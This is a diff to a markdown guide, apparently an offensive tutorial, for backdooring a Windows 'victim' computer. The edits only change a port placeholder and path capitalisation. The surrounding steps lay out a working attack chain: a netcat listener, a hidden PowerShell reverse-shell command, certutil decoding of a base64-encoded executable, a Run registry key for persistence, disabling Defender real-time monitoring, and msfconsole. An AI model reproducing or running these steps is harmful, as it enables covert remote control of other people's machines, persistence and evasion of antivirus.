@@ -8,7 +8,7 @@ Go to [Here](https://www.base64encode.org) to Encode Backdoor
 
 ## Netcat
 ``` bash
-nc -lvnp [Your port]
+nc -lvnp 1337
 ```
 ## Victim
 Run this in Victim Computer
@@ -18,7 +18,7 @@ powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Socke
 ## Make Directory
 Make Directory to save backdoor
 ``` bash
-mkdir c:\Users\[User_name]\AppData\LocalLow\Temp
+mkdir C:\Users\[User_name]\AppData\LocalLow\Temp
 ```
 ## Use python to make server
 
@@ -33,12 +33,12 @@ Download String From Your Server Python
 ## Ddecode Base64
 
 ``` powershell
-certutil -decode c:\Users\[User Name]\AppData\LocalLow\Temp\file-encode.txt c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
+certutil -decode C:\Users\[User Name]\AppData\LocalLow\Temp\file-encode.txt c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
 ```
 ## Create Regkey
 Create a Regkey to execute Backdoor when start Windows 
 ``` powershell
-New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "Sys" -Value "c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe" -PropertyType "String"
+New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "Sys" -Value "C:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe" -PropertyType "String"
 ```
 ## Msfconsole
 Run msfconsole
@@ -69,7 +69,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ## Unlock Backdoor
 ```powershell
-Unblock-File -Path c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
+Unblock-File -Path C:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
 ```
 ## Execute Backdoor
 ```powershell
